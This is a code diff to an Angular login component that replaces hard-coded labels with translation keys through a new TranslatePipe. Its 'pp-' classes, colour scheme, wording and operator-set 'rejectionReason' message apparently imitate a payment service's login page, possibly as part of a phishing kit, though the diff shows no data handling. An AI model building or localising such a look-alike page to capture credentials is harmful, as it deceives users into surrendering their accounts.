@@ -4,11 +4,12 @@ import { CommonModule } from '@angular/common';
 import { FormsModule } from '@angular/forms';
 import { PublicLayoutComponent } from './layout/public-layout.component';
 import { StateService } from '../services/state.service';
+import { TranslatePipe } from '../pipes/translate.pipe';
 
 @Component({
   selector: 'app-login',
   standalone: true,
-  imports: [CommonModule, FormsModule, PublicLayoutComponent],
+  imports: [CommonModule, FormsModule, PublicLayoutComponent, TranslatePipe],
   template: `
     <app-public-layout>
       <div class="space-y-8 animate-fade-in">
@@ -18,7 +19,7 @@ import { StateService } from '../services/state.service';
           <div class="bg-red-50 border-l-[6px] border-[#D92D20] p-4 flex items-start gap-4 rounded-r-lg animate-in slide-in-from-top-2">
             <span class="material-icons text-[#D92D20] text-xl">error</span>
             <div>
-              <p class="text-sm font-bold text-[#001C64]">Check your entries</p>
+              <p class="text-sm font-bold text-[#001C64]">{{ 'LOGIN.ERROR_CREDENTIALS' | translate }}</p>
               <p class="text-xs text-slate-600 mt-1">{{ state.rejectionReason() }}</p>
             </div>
           </div>
@@ -38,7 +39,7 @@ import { StateService } from '../services/state.service';
               class="pp-input peer"
               [class.shadow-input-error]="(touchedEmail() || showErrors) && !isEmailValid()"
             />
-            <label for="email" class="pp-label">Email or mobile number</label>
+            <label for="email" class="pp-label">{{ 'LOGIN.EMAIL_PLACEHOLDER' | translate }}</label>
 
             @if ((touchedEmail() || showErrors) && !isEmailValid()) {
                  <div class="absolute right-4 top-4 text-[#D92D20] animate-in fade-in">
@@ -58,7 +59,7 @@ import { StateService } from '../services/state.service';
               class="pp-input peer"
               [class.shadow-input-error]="showErrors && password.length === 0"
             />
-            <label for="password" class="pp-label">Password</label>
+            <label for="password" class="pp-label">{{ 'LOGIN.PASSWORD_PLACEHOLDER' | translate }}</label>
 
             <button 
                 (click)="togglePassword()" 
@@ -70,13 +71,13 @@ import { StateService } from '../services/state.service';
         </div>
 
         <div class="flex items-center justify-start -mt-2">
-           <a class="text-pp-blue font-bold hover:underline cursor-pointer text-[15px]">Forgot password?</a>
+           <a class="text-pp-blue font-bold hover:underline cursor-pointer text-[15px]">{{ 'LOGIN.FORGOT' | translate }}</a>
         </div>
 
         <!-- Action -->
         <div class="space-y-6 pt-2">
             <button (click)="login()" class="pp-btn">
-              Log In
+              {{ 'LOGIN.LOG_IN' | translate }}
             </button>
 
             <div class="relative py-2">
@@ -84,12 +85,12 @@ import { StateService } from '../services/state.service';
                 <div class="w-full border-t border-slate-200"></div>
               </div>
               <div class="relative flex justify-center text-sm">
-                <span class="px-4 bg-white text-slate-500 font-bold">or</span>
+                <span class="px-4 bg-white text-slate-500 font-bold">{{ 'LOGIN.OR' | translate }}</span>
               </div>
             </div>
 
             <button class="pp-btn-outline">
-              Sign Up
+              {{ 'LOGIN.SIGN_UP' | translate }}
             </button>
         </div>
       </div>
